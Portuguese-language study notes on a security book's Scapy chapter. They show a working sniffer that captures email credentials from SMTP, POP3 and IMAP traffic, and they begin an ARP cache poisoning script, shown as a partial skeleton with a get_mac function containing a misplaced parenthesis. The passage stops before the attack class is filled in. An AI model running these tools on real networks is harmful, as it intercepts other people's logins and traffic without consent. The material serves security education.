# Capitulo 4 

Neste capítulo será abordado o uso do Scapy como lib substituta para os dois capítulos anteriores. Ela é uma ferramenta completa e útil no contexto da segurança de redes no geral.

## Obtendo controle total da rede com Scapy

Aqui o autor faz uma breve introdução sobre como o [Scapy](https://scapy.readthedocs.io/en/latest/) poderia ser utilizado e introduz a sua utilização (que é recomendada para o Linux). Recomenda-se uma breve leitura sobre o que é o Scapy. Para instalá-lo, use:

`pip install scapy`

### Obtendo credenciais de e-mail

Nesse passo, criaremos um sniffer simples, para capturar as credenciais para os seguintes tipos de comunicação:

- `SMTP`: Simple Mail Transfer Protocol (Protocolo de Email)
- `POP3`: Post Office Protocol (Protocolo de Correio)
- `IMAP`: Internet Messages Access Protocol (Protocolo de Mensagens na Internet)

Mais tarde será explorado o uso do sniffer para realizar `ARP Poisoning`, que é uma forma de enganar os computadores no protocolo ARP (Address Resolution Protocol, que verifica para onde o roteador deve mandar os pacotes).

O Scapy oferece uma função `sniff` que opera da seguinte forma:

```py
sniff(filter="", iface="any", prn=function, count=N)
```

Onde:

- `filter`: Especifica um Berkeley Packet Filter ([BPF](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)), que pode ser deixado em branco para capturar todos os pacotes. O exemplo que ele dá no livro é: Caso se queira capturar pacotes HTTP, usa-se um BPF na `tcp port 80`, que é a porta em que são transferidos os pacotes HTTP
- `iface`: Especifica a interface de rede, em branco o Scapy capturará de todas as interfaces
- `prn`: Especifica a função de retorno a ser chamada para interpretar o pacote baseada no `filter`, recebendo o "objeto pacote" como único parâmetro
- `count`: Especifica quantos pacotes se deseja capturar. Deixado em branco ele capturará pacotes indefinidamente

Vamos ao código `main_sniffer.py`, que, assim como os códigos do capítulo 3, deve ser executado como admnistrador (ou sudo):

```py
# Import do Scapy
from scapy.all import sniff

# Função a ser chamada, ela basicamente printa as informações do pacote
def packet_callback(packet):
    print(packet.show())
    
def main():
    # Função sniff que, nesse momento, apenas lê qualquer pacote e printa
    sniff(prn=packet_callback, count=1)

if __name__ == '__main__':
    main()
```

A resposta é do estilo:

```
###[ Ethernet ]###
  dst       = f4:7b:09:4f:95:e8
  src       = 00:e4:06:2b:2c:9a
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 40
     id        = 4786
     flags     = DF
     frag      = 0
     ttl       = 55
     proto     = tcp
     chksum    = 0xe7b1
     src       = 23.37.13.82
     dst       = 192.168.100.77
     \options   \
###[ TCP ]###
        sport     = https
        dport     = 51354
        seq       = 539389632
        ack       = 2541316327
        dataofs   = 5
        reserved  = 0
        flags     = A
        window    = 493
        chksum    = 0xade
        urgptr    = 0
        options   = []
###[ Padding ]###
           load      = b'\x00\x00'

None
```

Bastante completa, contudo é importante que tenhamos filtros para que seja possível entender melhor cada informação sendo transferida. Usaremos então a sintaxe do BPF (ou estilo *Wireshark*) para filtrar as informações que desejamos.

Existem 3 tipos de filtros:

- Descritores (como um host, interface ou porta específica)
- Direção (como source ou destiny)
- Protocolo (como ip, tcp ou udp)

Veja a seguinte tabela:

| Expressão | Descrição | Palavras-chave do filtro |
| :---------- | :------------------------------ | :----------------|
| Descritor | O que você está procurando | `host`, `net`, `port` |
| Direção | Direção de descolamento | `src`, `dst`, `src or dst` |
| Protocolo | Protocolo utilizado para enviar o tráfego | `ip`, `tcp`, `ip6`, `udp` |

Exemplo:

- A expressão `src 192.168.100.55` especifica que queremos pacotes vindo apenas de 192.168.100.55.
- A expressão `tcp port 25 or tcp port 100` especifica que queremos apenas pacotes TCP das portas 25 ou 100

Agora escreveremos nossos sniffer específico usando a sintaxe BPF:

```py
from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    if packet[TCP].payload:
        # Para o payload do pacote
        mypacket = str(packet[TCP].payload)
        # Procuramos algo como USERNAME e PASSWORD, para achar as credenciais de emails na rede
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destino: {packet[IP].dst}')
            print(f'[*] {mypacket}')
    
def main():
    # Mudamos a configuração para ouvir as portas 110 (POP3), 25 (SMTP) e 143 (IMAP) atrás de achar relacionamentos com email
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
          prn=packet_callback, store=0)

if __name__ == '__main__':
    main()
```

Agora com o sniffing de emails feito, podemos passar para o próximo passo: envenenamento ARP para que possamos receber pacotes de outros IPs e lê-los sem que a vítima perceba.

### Evenenamento de cache ARP com o Scapy

O [evenenamento ARP](https://www.geeksforgeeks.org/arp-spoofing-and-arp-poisoning/) é uma técnica antiga que muda a forma com que a rede entende os endereços de envio das mensagens.

O protocolo ARP (Address Resolution Protocol) nada mais é que uma tabela com os endereços físicos dos computadores da rede (MAC - Media Access Control - addresses) associados aos endereços de IP e que é armazenada em uma memória cache em cada máquina. 

Neste ataque, modificaremos a tabela de forma a trocar o MAC do IP da vítima para o nosso IP de ataque. Ao invés de enviar/receber pacotes para o roteador/switch a vítima enviará para no atacante:

![ARP_P](../imagens/ARPPoisoningSpoofing.png)

O primeiro passo para isso é saber qual o endereço de IPv4 local da máquina-alvo. Pode-se usar `ifconfig` para Linux e Mac ou `ipconfig` para Windows no terminal da máquina. Em casos mais avançados pode-se usar o `nmap`, mas isso não será abordado agora.

Vale ressaltar que esse ataque ARP só serve para IPv4.

Agora, ainda na vítima, procuraremos qual o endereço MAC o protocolo seu protocolo ARP está direcionando para o atacante. Para isso utilizae `arp -a` e procure o MAC (no formato `xx-xx-xx-xx-xx-xx`) associado ao seu IP:

![IP_ARP](../imagens/IP_arp.png)

É possível achar o seu próprio enderereço MAC através das configurações de rede do dispositivo de ataque.

No nosso caso:

- IP Alvo = `192.168.100.82`
- MAC Alvo = `00-e0-1f-95-05-f7`

- IP Local = `192.168.100.77`
- MAC Local = `f4-7b-09-4f-95-e8`

Também devemos encontrar a interface de rede que estamos utilizando para fazer o ataque. No windows, usando `ipconfig` é possível ver o nome da interface a ser usada, nela encontra-se o IP local que você está utilizando:

![ipconfig](../imagens/IPCONFIG.png)

Você deve associar a interface vista em `arp -a` com um adaptador visto no `ipconfig`. Note que ele vem precedido de um descritivo de tipo de rede, com o nome visto em seguida. Se houver dúvida em relação ao "nome da interface", utilize no Powershell `Get-NetAdapter`, que terá uma lista de todos os nomes dos adaptadores de rede:

![adapter](../imagens/netadapt.png)

No Linux e no Mac é mais simples, pois ao usar `ifconfig` já aparece a interface na esquerda:

![adapter_Linux](../imagens/arp_linux.png)

Agora criaremos o arquivo `arper.py` para iniciarmos o envenenamento ARP:

```py
# Imports: multiprocessing, para a execução de processos paralelos (é diferente de threading, pois ela faz todas as execuções
# no mesmo processo)
from multiprocessing import Process
# Imports: funções do Scapy
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
                       send, sniff, sndrcv, srp, wrpcap)
# Outros imports
import os
import sys
import time

# Abstração de funções
# Pega o endereço mac de determinado IP
def get_mac(target_ip):
    pass

# Nossa classe Arper, que irá realizar as 'atividades'
class Arper:
    def __init__(self, victim, gateway, interface='Wi-Fi'):
        pass
    
    def run(self):
        pass

    def poison(self):
        pass
    
    def sniff(self, count=200):
        pass
    
    def restore(self):
        pass
    
# Na execução, espera o ip da vítima, o gateway (IP do roteador, por exemplo) e a interface de rede
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
```

Agora, modificando a nossa função `get_mac`:

```py
def get_mac(target_ip):
    # Define um pacoe que deve ser enviado para o pacote Ethernet com um quadro de broadcast ('ff..ff') 
    # que carregará a operação 'who-has' do ARP para determinado IP
    packet = Ether(dst='ff:ff:ff:ff:ff:ff'/ARP(op='who-has', pdst=target_ip))
    # Usando o srp, que envia pacotes do nível 2 (enlance de rede), ele tenta várias vezes até receber uma resposta.
    # Quando ele recebe a resposta significa que o IP alvo existe na rede e tem o source (src) na mensagem
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None
```

Agora nossa função poderá capturar o endereço MAC tanto da nossa vítima quanto do nosso gateway, que nos permitirá executar o enevenamento sem ter que usar o comandos acima. Em seguida, modificaremos nossa classe `Arper`:


